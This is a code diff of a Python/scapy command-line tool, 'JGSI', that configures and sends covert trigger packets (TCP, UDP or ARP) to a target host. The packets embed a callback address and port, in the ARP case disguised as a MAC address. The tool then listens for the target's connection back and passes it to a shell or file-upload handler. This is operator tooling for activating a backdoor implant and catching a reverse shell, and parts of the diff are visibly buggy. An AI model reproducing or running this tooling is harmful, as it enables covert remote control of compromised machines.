@@ -10,6 +10,7 @@ import pickle
 import os
 import ipaddress
 import readline
+
 from scapy.all import *
 
 
@@ -23,20 +24,24 @@ YELLOW_BLINK = '\033[33;5m'
 OVERWRITE    = '\033[1000D'
 
 
-class JGSIshell(cmd.Cmd):
-    intro = ("" + RED +\
-                u"                    ██╗ ██████╗ ███████╗ ██╗\n" +\
-                u"                    ██║██╔════╝ ██╔════╝ ██║\n" +\
-                u"                    ██║██║  ███╗███████╗ ██║\n" +\
-                u"               ██   ██║██║   ██║╚════██║ ██║\n" +\
-                u"               ╚█████╔╝╚██████╔╝███████║ ██║\n" +\
-                u"                ╚════╝  ╚═════╝ ╚══════╝ ╚═╝\n\n" + RESET)
+class Trigger(object):
+    def __init__(self):
+        self.name = "DEFAULT" 
+        self.source = "127.0.0.1"
+        self.targetAddr = "127.0.0.1"
+        self.targetPort = 80
+        self.sPort = 80
+        self.triggerType = "TCP"
+        self.cPort = 80
+        self.callbackAddr = "127.0.0.1"
 
+class JGSIshell(cmd.Cmd):
 
     prompt = "JGSI ->"
     ruler = '~'
     local_addresses = []
     triggers = []
+    trigger = Trigger()
 
     # Acquire local address (hopefully not picking the loopback address)
     try:
@@ -48,75 +53,27 @@ class JGSIshell(cmd.Cmd):
     local_ip = local_addresses[-1]
 
 
-    def do_build_trigger(self,arg):
-        'Build TArp Trigger'
-        self.triggers.append(self.buildTrigger())
-
-    def do_load_triggers(self,arg):
-        'Reload previously created triggers'
-
-    def buildTrigger(self):
-        'Code block to build the trigger'
-
-        unique = False
-        tName = input("Enter uniquer trigger name: ")
-        while not unique:
-            if len(self.triggers) != 0:
-                for tgr in self.triggers:
-                    if str(tgr.name) == str(tName):
-                        print("trigger name already in use")
-                    else:
-                        unique = True
-            else:
-                unique = True
-
-        try:
-            sAddr = ipaddress.IPv4Address(input("Enter Source Address: "))
-        except ValueError:
-            print("Invalid IPv4 address: ")
-            sAddr = ipaddress.IPv4Address(input("Enter a valid source Address: "))
-
-        try:
-            tAddr = ipaddress.IPv4Address(input("Enter Target Address: "))
-        except ValueError:
-            print("Invalid IPv4 address: ")
-            tAddr = ipaddress.IPv4Address(input("Enter valid IPv4 target address: "))
-
-
-        tPort = input("Enter trigger dest port: ")
-        if not self.validPort(tPort):
-            tPort = input("Enter a valid dest port: ")
-       
-        sPort = input("Enter source port: ")
-        if not self.validPort(sPort):
-            sPort = input("Enter a valid source port: ")
-
-        tType = str.upper(input("Enter trigger type (ARP | UDP | TCP): "))
-        if not self.validateType(tType):
-            tType = str.upper(input("Type must be (ARP | UDP | TCP): "))
-
-        cPort = input("Enter call back port: ")
-        if not self.validPort(cPort):
-            cPort = input("Enter a valid source port: ")
-        
-        try:
-            callback = ipaddress.IPv4Address(input("Enter call back address: "))
-        except ValueError:
-            callback = ipaddress.IPv4Address(input("Enter a valid call back address: "))
-
-        if(self.validateInput(tPort,tType,sPort,cPort)):
-            trigger = Trigger(tName,tAddr,tPort,tType,sPort,cPort,callback)
-            return trigger
+    def do_build(self,arg):
+        'build : builds trigger based on current configuration'
+        if len(self.triggers) == 0:
+            self.triggers.append(self.trigger)
         else:
-            print("ERROR building trigger")
-            return "NONE"
-   
+            for tgr in self.triggers:
+                if str(tgr.name) == str(self.trigger.name):
+                    Display().alert('trigger name already in use[Build FAILED!]')
+                else:
+                   self.triggers.append(self.trigger)
+            
+
     def do_list_triggers(self,arg):
-        'Show available triggers'
+        'list_triggers : shows built triggers'
+        if len(self.triggers) == 0:
+            Display().info("No triggers configured")
+
         for tgr in self.triggers:
             msg0 = "======TRIGGER " + str(tgr.name) + " DETAILS===="
             print(msg0)
-            msg00 = "SOURCE: " + str(tgr.srcAddr)
+            msg00 = "SOURCE: " + str(tgr.source)
             Display().info(msg00)
             msg = "TARGET : " + str(tgr.targetAddr)
             Display().info(msg)
@@ -131,17 +88,120 @@ class JGSIshell(cmd.Cmd):
             msg5 = "CALLBACK ADDR: " + str(tgr.callbackAddr)
             Display().info(msg5)
         
-    def do_send_trigger(self,arg):
-        'Send trigger'
+    def do_send(self,arg):
+        'send <name> : sends trigger of <name>'
+        found = False
+        for tgr in self.triggers:
+            if tgr.name == arg:
+                found = True
+                self.buildPacket(tgr)
+            else:
+                pass
+
+        if found == False:
+            msg = str(arg) + "does NOT exist!"
+            Display().alert(msg)
         
+    def do_set(self,arg):
+        'set <option> <value> : sets trigger field values'
+        args = arg.split(" ")
+        
+        if str.lower(args[0]) == "targetport":
+            if self.validPort(args[1]):
+                self.trigger.targetPort = int(args[1])
+            else:
+                Display().alert("Invalid Target port")
+
+        elif str.lower(args[0]) == "target":
+            try:
+                temp = netaddr.IPAddress(args[1])
+                if (validIP(temp)):
+                        self.trigger.targetAddr = args[1]
+            except ValueError:
+                print("Invalid IP address set, leaving Target address as default")
+                self.trigger.targetAddr = netaddr.IPAddress("127.0.0.1")
+        elif str.lower(args[0]) == "source":
+            try:
+                temp = netaddr.IPAddress(args[1])
+                if (validIP(temp)):
+                        self.trigger.targetAddr = args[1]
+            except ValueError:
+                print("Invalid IP address set, leaving source address as default")
+                self.trigger.source = netaddr.IPAddress("127.0.0.1")
+        elif str.lower(args[0]) == "sourceport":
+            if self.validPort(args[1]):
+                self.trigger.sPort = int(args[1])
+            else:
+                Display.alert("Invalid Source Port")
+                
+        elif str.lower(args[0]) == "callbackport":
+            if self.validPort(args[1]):
+                self.trigger.cPort = int(args[1])
+            else:
+                Display().alert("Invalid CallBack Port")
+
+        elif str.lower(args[0]) == "callback":
+            try:
+                temp = netaddr.IPAddress(args[1])
+                if (validIP(temp)):
+                    self.trigger.callbackAddr = args[1]
+            except ValueError:
+                print("Invalid IP address set, leaving callback address as default")
+                self.trigger.callbackAddr = netaddr.IPAddress("127.0.0.1")
+        
+        elif str.lower(args[0]) == "triggertype":
+            if self.validateType(str.upper(args[1])):
+                self.trigger.triggerType = str.upper(args[1])
+            else:
+                Display().alert("Valid types are [ARP || UDP || TCP]")
+        
+        elif str.lower(args[0]) == "name":
+            if len(self.triggers) != 0:
+                for tgr in self.triggers:
+                    if str(tgr.name) == str(args[1]):
+                        Display().alert("trigger name already in use")
+                else:
+                    self.trigger.name = args[1]
+
+        else:
+            Display().alert("Invalid option")
+
+    def do_show(self,arg):
+        'show options : show details of current trigger'
+        if str.lower(arg) == "options":
+            msg0 = "======TRIGGER " + str(self.trigger.name) + " DETAILS===="
+            print(msg0)
+            msg00 = "SOURCE: " + str(self.trigger.source)
+            Display().info(msg00)
+            msg = "TARGET : " + str(self.trigger.targetAddr)
+            Display().info(msg)
+            msg1 = "TARGET PORT: " + str(self.trigger.targetPort)
+            Display().info(msg1)
+            msg2 = "Source PORT: " + str(self.trigger.sPort)
+            Display().info(msg2)
+            msg3 = "TYPE : " + str(self.trigger.triggerType)
+            Display().info(msg3)
+            msg4 = "CALLBACK PORT: " + str(self.trigger.cPort)
+            Display().info(msg4)
+            msg5 = "CALLBACK ADDR: " + str(self.trigger.callbackAddr)
+            Display().info(msg5)
+    
+            
     def do_exit(self,arg):
         'Exit JGSI'
         print("JGSI -> FIMO")
         exit(1)
 
-    def do_save_triggers(self,arg):
-        'Work in progress, dead command for now'
-    
+    def do_save(self,arg):
+        'save : saves all built triggers in triggers/ for import in a later session'
+
+
+    def validIP(ipaddr):
+        if not netaddr.valid_ipv4(ipaddr):
+            msg = "Not a valid IP address (%s)" % ipaddr
+            Display.alert(msg)
+        return ipaddr
+
     def validPort(self,port):
         validPort = False
 
@@ -202,29 +262,29 @@ class JGSIshell(cmd.Cmd):
 
         return validatedInput
 
-    def trigger_prompt(packet,trigger):
+    def trigger_prompt(self,packet,trigger):
         'Displays the created trigger that will be sent to the target for verification of details prior to firing.  Receives packet(p) and the full args object.'
     
 
-        if trigger.triggerType == 'tcp' or trigger.triggerType == 'udp':
+        if str.lower(trigger.triggerType) == 'tcp' or str.lower(trigger.triggerType == 'udp'):
             print("\nPreparing to send a trigger packet with the folowing details...\n")
             print("========IP Header======")
             print("Source: %s" % packet.src)
             print("Dest  : %s" % packet.dst)
-            print("=======%s Header======" % trigger.tType.upper())
+            print("=======%s Header======" % trigger.triggerType.upper())
             print("SPort : %s" % packet.sport)
             print("DPort : %s" % packet.dport)
             print("=====Callback Data=====")
-            print("IP    : %s" % trigger.callback)
+            print("IP    : %s" % trigger.callbackAddr)
             print("Port  : %s" % trigger.cPort)
             '''if args.upload:
                 print "======File Upload======"
                 print args.upload.name
             else:
                 print "====Shell Callback====="'''
-	    print("==========================")
+            print("==========================")
         
-            resp = raw_input("\nReady to send it? ").lower()
+            resp = input("\nReady to send it? ").lower()
             if resp == "yes" or resp == "y":
                 sendIT = True
             elif resp == "no" or resp == "n":
@@ -249,7 +309,7 @@ class JGSIshell(cmd.Cmd):
             
             print("==========================")
         
-            resp = raw_input("\nReady to send it? ").lower()
+            resp = input("\nReady to send it? ").lower()
             if resp == "yes" or resp == "y":
                 sendIT = True
             elif resp == "no" or resp == "n":
@@ -308,27 +368,27 @@ class JGSIshell(cmd.Cmd):
 
     def buildPacket(self,trigger):
 
-        display = Display()
+        sendIt = False
 
-        if trigger.triggerType == "tcp":
+        if str.lower(trigger.triggerType) == "tcp":
 
-            ip_layer = IP(dst=args.target,src=args.source)
+            ip_layer = IP(dst=trigger.targetAddr,src=trigger.source)
             tcp_layer = TCP(dport=trigger.targetPort,sport=trigger.sPort)
-            callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=netaddr.IPAddress(args.c_addr).packed)
+            callback = Raw(load=struct.pack("!H",trigger.cPort))/Raw(load=netaddr.IPAddress(trigger.callbackAddr).packed)
             packet = ip_layer/tcp_layer/callback
         
-            trigger_prompt(trigger,args)
+            sendIt = self.trigger_prompt(packet,trigger)
 
-        elif trigger.triggerType == "udp":
+        elif str.lower(trigger.triggerType) == "udp":
 
-            ip_layer = IP(dst=args.target,src=args.source)
+            ip_layer = IP(dst=trigger.targetAddr,src=trigger.source)
             udp_layer = UDP(dport=trigger.targetPort,sport=trigger.sPort)
-            callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=netaddr.IPAddress(args.c_addr).packed)
+            callback = Raw(load=struct.pack("!H",trigger.cPort))/Raw(load=trigger.callbackAddr.packed)
             trigger = ip_layer/udp_layer/callback
 
-            trigger_prompt(trigger,args)
+            sendIt = self.trigger_prompt(trigger,args)
 
-        elif trigger.triggerType == "arp":
+        elif str.lower(trigger.triggerType) == "arp":
 
             # build hwsrc field to hide the callback address and port as a pseudo mac address
             callback = []
@@ -340,55 +400,61 @@ class JGSIshell(cmd.Cmd):
  
             packet = ARP(pdst = trigger.targetAddr, hwdst = "ff:fe:ff:ff:fe:ff", hwsrc = callback)
 
-            trigger_prompt(packet,args)
+            sendIt = self.trigger_prompt(packet,args)
 
-        if trigger.callback in local_addresses or "0.0.0.0":
+        if trigger.callbackAddr in self.local_addresses or "0.0.0.0":
 
             #print "[%s*%s] Preparing listener." 
-            display.info("Preparing listener.")
+            Display().info("Preparing listener.")
 
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.settimeout(30)
             try:
-                s.bind((trigger.callback,trigger.cPort))
+                s.bind((trigger.callbackAddr,trigger.cPort))
                 s.listen(1)
             except:
                 #print "[!] Failed to bind listener" % (YELLOW_BINK,RESET)
-                display.alert("Failed to bind listener")
-                sys.exit(1)
+                Display().alert("Failed to bind listener")
+                #sys.exit(1)
 
             #print "[*] Ready to receive callback. Sending trigger!" % (RED_BLINK,RESET)
-            display.info("Ready to receive callback. Sending trigger!")
-            send(packet)
+            Display().info("Ready to receive callback. Sending trigger!")
+            if sendIt == True:
+                send(packet)
+            else:
+                Display().alert("Trigger not prepared[SEND FAILED]")
         
             #print "[*] Waiting for callback....." % (RED_BLINK,RESET)
-            display.info("Waiting for callback....")
+            Display().info("Waiting for callback....")
             try:
-                callback, c_info = s.accept()
+                trigger.callbackAddr, c_info = s.accept()
                 #print "[%s!%s] Received connection from %s" % (YELLOW_BLINK,c_info[0],RESET)
-                display.alert("Received connection from %s" % c_info[0])
+                Display().alert("Received connection from %s" % c_info[0])
             except socket.timeout:
                 #print "[%s!%s] No response, exiting..." % (YELLOW_BLINK,RESET)
-                display.alert("No response, exiting...")
+                Display().alert("No response, exiting...")
                 sys.exit(1)
 
             if not args.upload:
-                handle_shell(callback, c_info)
+                handle_shell(trigger.callbackAddr, c_info)
             else:
-                display.info("Uploading file..")
+                Display().info("Uploading file..")
                 handle_upload(callback, args.upload)
-                display.info("File upload complete.")
+                Display().info("File upload complete.")
 
         else:
 
             #print "\n[!] Callback address does not appear to be on this box.\n Ensure a " +\
                 #"listener is ready.\n"
-            display.alert("Callback address not on this box. Ensure a listener is ready.")
+            Display().alert("Callback address not on this box. Ensure a listener is ready.")
             raw_input("Press [ENTER] to continue....")
-            send(trigger)
+            if sendIt == True:
+                send(trigger)
+            else:
+                Display().alert("Trigger not prepared[SEND FAILED]")
 
-    
+
 class Display(object):
 
     def alert(self,message):
@@ -398,28 +464,7 @@ class Display(object):
         print("[%s*%s] %s" % (RED,RESET,message))
 
 
-class Trigger:
-    "Class to build TArp Trigger"
-    def __init__(self,name,srcAddr,targAddr,dPort,tType,sPort,cPort,callbackAddr):
-        self.name = name
-        self.source = srcAddr
-        self.targetAddr = targAddr
-        self.targetPort = dPort
-        self.sPort = sPort
-        self.triggerType = tType
-        self.cPort = cPort
-        self.callbackAddr = callbackAddr
-
-    def setTarget(self):
-        self.targetAddr = input("Enter the target IP: ")
-
-    def setTargPort(self):
-        self.targetPort = input("Enter the target Port: ")
-
-    def setTriggerType(self):
-        self.triggerType = input("Enter the trigger type (ARP | UDP | TCP): ")
-        
-            
-
+ 
 if __name__ == "__main__":
    JGSIshell().cmdloop() 
+
